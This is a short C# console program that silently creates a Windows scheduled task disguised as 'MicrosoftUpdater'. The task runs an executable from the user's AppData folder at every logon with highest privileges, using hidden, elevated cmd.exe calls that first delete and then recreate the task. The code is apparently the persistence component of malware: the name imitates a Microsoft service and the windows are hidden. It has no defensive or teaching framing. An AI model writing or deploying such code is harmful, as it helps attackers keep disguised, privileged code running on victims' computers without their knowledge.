using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace ConsoleApp5
{
    class Program
    {
        static void Main(string[] args)
        {
            new Process
            {
                StartInfo =
                {
                    FileName = "cmd.exe",
                    Verb = "runas",
                    Arguments = "/C SCHTASKS /Delete /TN MicrosoftUpdater /F",
                    WindowStyle = ProcessWindowStyle.Hidden
                }
            }.Start();

            new Process
            {
                StartInfo =
                {
                    FileName = "cmd.exe",
                    Verb = "runas",
                    Arguments = "/C SCHTASKS /Create /RL HIGHEST /SC ONLOGON /TN MicrosoftUpdater /TR " +
                        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\MicrosoftUpdater\\Service.exe",
                    WindowStyle = ProcessWindowStyle.Hidden
                }
            }.Start();


        }
    }
}
